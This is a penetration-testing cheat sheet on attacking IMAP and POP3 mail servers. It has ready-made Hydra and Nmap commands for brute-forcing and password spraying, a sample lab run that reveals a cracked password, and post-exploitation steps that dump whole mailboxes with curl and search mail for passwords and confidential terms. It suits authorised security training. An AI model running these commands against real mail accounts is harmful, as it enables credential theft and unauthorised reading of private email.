---
id: Exploitation
aliases: []
tags:
  - Networking/Services/IMAP-POP3/Exploitation
links: ""
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- IMAP {{{-->
## IMAP

<!-- Authentication {{{-->
### Authentication

<!-- Anonymous Login {{{-->
#### Anonymous Login

Anonymous Simple Authentication
(*[RFC 4505](https://www.rfc-editor.org/rfc/rfc4505)*)

```sh
a1 LOGIN "" ""
```

<!-- }}} -->

<!-- Brute Force {{{-->
#### Brute Force

Brute force IMAP/S server credentials

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [[Rockyou#Wordlist|Rockyou]]
>
<!-- }}} -->

[[Nmap]]

```sh
nmap $target -p 143,993 --script imap-brute -oA imap-brute
```

```sh
nmap -sV $target -p <port> --script imap-brute -oA imap-brute-version
```

[[Hydra]]

IMAPS (*SSL/TLS*)

```sh
hydra -I -S -l <username> -P <passwords.txt> -f $target -s 993 imap -v
```

<!-- Info {{{-->
> [!info]-
>
> - `-I`: Ignore an existing restore file
>         (*don't wait 10 seconds*)
> - `-s`: Port
> - `-S`: Connect via SSL
> - `-v`: Verbose mode
>
<!-- }}} -->


IMAP (*plaintext*)

```sh
hydra -I -l <username> -P <passwords.txt> -f $target imap -V
```

Multiple users

```sh
hydra -I -L <users.txt> -P <passwords.txt> imap://$target
```

<!-- }}} -->

<!-- Pass-the-Hash {{{-->
#### Pass-the-Hash

Exploit [[NTLM]] authentication to use password hashes instead of plaintext
passwords

[[Nmap]] â€” Check if NTLM auth is supported

```sh
nmap $target -p 143 --script imap-ntlm-info -oA imap-script-ntlm-info
```

<!-- }}} -->

<!-- Password Spraying {{{-->
#### Password Spraying

[[Brute Force/General#Password Spraying|Password Spraying]]
IMAP/S Login

<!-- Tip {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[Seclists#Usernames|Seclists]]
> - [[Wordlists/Metasploit#Usernames|Metasploit]]
>
<!-- }}} -->

[[Hydra]]

IMAPS (*SSL/TLS*)

```sh
hydra -I -S -v -L <users.txt> -p <password> -f $target -s 993 imap -V
```

IMAP (*plaintext*)

```sh
hydra -I -L <users.txt> -p <password> -f $target imap -V
```

<!-- }}} -->

___
<!-- }}} -->

<!-- IMAP Injection {{{-->
### IMAP Injection

[IMAP injection attacks](https://hackviser.com/tactics/pentesting/services/imap#imap-injection)
involve injecting malicious commands or data into IMAP requests
to exploit vulnerabilities in the server software
or gain unauthorized access to email accounts.

___
<!-- }}} -->

<!-- Man-in-the-Middle {{{-->
### Man-in-the-Middle

[MitM attacks](https://hackviser.com/tactics/pentesting/services/imap#man-in-the-middle-mitm-attacks)
on IMAP traffic can intercept and modify email messages
exchanged between the client and server,
compromising the confidentiality and integrity
of email communication.

___
<!-- }}} -->

<!-- }}} -->

<!-- POP3 {{{-->
## POP3

<!-- Brute Force {{{-->
### Brute Force

Brute force POP3 login credentials

<!-- Wordlist {{{-->
> [!tip]- Wordlist
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> - [[Pentest/Tools/Metasploit/Metasploit#Usernames|Metasploit]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [[Rockyou#Wordlist|Rockyou]]
>
<!-- }}} -->

[[Nmap]]

```sh
nmap $target -p 110 --script pop3-brute --script-args userdb=users.txt,passdb=pass.txt -oA pop3-brute
```

[[Hydra]]

```sh
hydra -l <username> -P <passwords.txt> -f $target pop3 -V
```

```sh
hydra -L <users.txt> -P <passwords.txt> -f $target pop3 -V
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
> ```
> ```sh
> Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
>
> Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
> [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
> [DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
> [DATA] attacking pop3://10.10.110.20:110/
> [110][pop3] host: 10.129.42.197   login: john   password: Company01!
> 1 of 1 target successfully completed, 1 valid password found
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- IMAP {{{-->
## IMAP

<!-- Email Extraction {{{-->
### Email Extraction

Extract emails and sensitive information from compromised IMAP accounts

Read all emails

```sh
a1 LOGIN <username> <password>
```

```sh
a2 SELECT INBOX
```

```sh
a3 FETCH 1:* (BODY[])
```

Search for specific content

```sh
a4 SEARCH SUBJECT "password"
```
```sh
a5 SEARCH FROM "admin@target.com"
```
```sh
a6 SEARCH TEXT "confidential"
```

Download all emails

```sh
for i in {1..100}; do
  curl -u <username>:<password> "imap://$target/INBOX;UID=$i" > email_$i.eml
done
```

___

<!-- }}} -->

<!-- Sensitive Information {{{-->
### Sensitive Information

Search for [[Secrets]] and other sensitive information in the email content

Search for keywords

```sh
SEARCH TEXT "user"
```

```sh
SEARCH TEXT "password"
```

```sh
SEARCH TEXT "credential"
```

```sh
SEARCH TEXT "confidential"
```

```sh
SEARCH SUBJECT "reset"
```

Search by date

```sh
SEARCH SINCE 01-Jan-2024
```

Combined search

```sh
SEARCH FROM "admin" SUBJECT "password"
```

___

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
